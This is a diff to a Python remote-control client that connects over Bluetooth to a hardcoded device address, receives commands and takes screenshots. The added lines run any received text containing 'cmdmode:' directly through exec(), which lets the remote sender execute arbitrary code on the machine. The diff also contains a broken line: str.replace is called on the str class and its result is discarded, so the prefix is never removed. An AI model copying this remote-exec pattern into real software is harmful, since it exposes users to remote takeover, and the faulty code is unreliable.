@@ -2,7 +2,7 @@ import socket
 import ClientUI
 import threading
 import pyautogui
-
+import os 
 client = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
 client.connect(("6c:2f:80:71:84:8b", 4))
 
@@ -23,6 +23,9 @@ try:
             th.start()
         elif dec == "3":
             pyautogui.screenshot().save("Screenshot.png")
+        elif "cmdmode:" in  dec:
+            str.replace('cmdmode:', '')
+            exec(dec)
     print("Update Window")
 except OSError as e:
     pass
